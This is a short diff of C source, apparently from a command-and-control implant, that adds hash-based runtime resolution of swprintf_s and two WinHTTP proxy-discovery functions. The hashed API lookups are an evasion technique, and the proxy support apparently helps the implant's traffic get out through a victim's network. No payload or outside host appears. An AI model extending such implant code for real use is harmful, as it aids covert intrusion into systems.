@@ -220,7 +220,8 @@ BOOL RtMsvcrt(
 
     if ( ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
-        Instance.Win32.vsnprintf = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
+        Instance.Win32.vsnprintf  = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
+        Instance.Win32.swprintf_s = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_SWPRINTF_S );
 
         PUTS( "Loaded Msvcrt functions" )
     } else {
@@ -475,16 +476,18 @@ BOOL RtWinHttp(
 
     if ( ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
-        Instance.Win32.WinHttpOpen              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
-        Instance.Win32.WinHttpConnect           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
-        Instance.Win32.WinHttpOpenRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
-        Instance.Win32.WinHttpSetOption         = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
-        Instance.Win32.WinHttpCloseHandle       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
-        Instance.Win32.WinHttpSendRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
-        Instance.Win32.WinHttpAddRequestHeaders = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
-        Instance.Win32.WinHttpReceiveResponse   = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
-        Instance.Win32.WinHttpReadData          = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
-        Instance.Win32.WinHttpQueryHeaders      = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
+        Instance.Win32.WinHttpOpen                           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
+        Instance.Win32.WinHttpConnect                        = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
+        Instance.Win32.WinHttpOpenRequest                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
+        Instance.Win32.WinHttpSetOption                      = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
+        Instance.Win32.WinHttpCloseHandle                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
+        Instance.Win32.WinHttpSendRequest                    = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
+        Instance.Win32.WinHttpAddRequestHeaders              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
+        Instance.Win32.WinHttpReceiveResponse                = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
+        Instance.Win32.WinHttpReadData                       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
+        Instance.Win32.WinHttpQueryHeaders                   = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
+        Instance.Win32.WinHttpGetIEProxyConfigForCurrentUser = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
+        Instance.Win32.WinHttpGetProxyForUrl                 = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );
 
         PUTS( "Loaded WinHttp functions" )
     } else {
